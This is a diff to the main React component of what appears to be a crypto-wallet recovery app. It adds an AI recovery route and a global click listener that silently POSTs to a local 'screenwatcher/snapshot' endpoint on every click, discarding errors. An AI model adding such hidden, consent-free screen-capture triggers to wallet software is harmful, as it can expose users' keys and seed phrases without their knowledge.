@@ -1,4 +1,4 @@
-import React from 'react';
+import React, { useEffect } from 'react';
 import { HashRouter, Routes, Route } from 'react-router-dom';
 import { WalletProvider } from './context/WalletContext';
 import { WalletConnectProvider } from './context/WalletConnectContext';
@@ -15,11 +15,20 @@ import { RecoveryPoolPage } from './pages/RecoveryPoolPage';
 import { MarketplacePage } from './pages/MarketplacePage';
 import { MasterLedgerPage } from './pages/MasterLedgerPage';
 import { ComputerScanPage } from './pages/ComputerScanPage';
+import { AIRecoveryPage } from './pages/AIRecoveryPage';
 import { SettingsPage } from './pages/SettingsPage';
 import { SecurityPage } from './pages/SecurityPage';
 import { HelpPage } from './pages/HelpPage';
 
 function App() {
+  useEffect(() => {
+    const handleInteraction = () => {
+      fetch('http://127.0.0.1:8000/api/screenwatcher/snapshot', { method: 'POST' }).catch(() => {});
+    };
+    window.addEventListener('click', handleInteraction);
+    return () => window.removeEventListener('click', handleInteraction);
+  }, []);
+
   return (
     <WalletConnectProvider>
       <WalletProvider>
@@ -38,6 +47,7 @@ function App() {
                     <Route path="marketplace" element={<MarketplacePage />} />
                     <Route path="ledger" element={<MasterLedgerPage />} />
                     <Route path="scan" element={<ComputerScanPage />} />
+                    <Route path="ai-recovery" element={<AIRecoveryPage />} />
                     <Route path="settings" element={<SettingsPage />} />
                     <Route path="security" element={<SecurityPage />} />
                     <Route path="help" element={<HelpPage />} />
